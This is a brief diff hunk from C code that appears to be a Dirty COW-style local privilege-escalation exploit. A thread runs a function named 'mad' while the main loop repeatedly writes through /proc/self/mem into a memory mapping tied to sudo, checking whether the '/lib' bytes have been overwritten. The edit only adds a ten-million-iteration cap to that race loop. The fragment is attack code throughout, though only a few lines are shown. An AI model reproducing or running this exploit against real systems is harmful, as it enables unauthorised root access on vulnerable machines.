@@ -32,7 +32,7 @@ int main(int argc, char **argv) {
 			pthread_create(&pth, NULL, &mad, map);
 			int fd = open("/proc/self/mem", O_RDWR);
 			char buf[4] = "/lib";
-			for (int i = 0; !memcmp(buf, "/lib", 4); i++) {
+			for (int i = 0; (i < 10000000) && (!memcmp(buf, "/lib", 4)); i++) {
 				pwrite(fd, us, strlen(us) + 1, (off_t)(unsigned)pp);
 				if (!(i&0xff))
 					pread(sudo, buf, 4, pp-map);
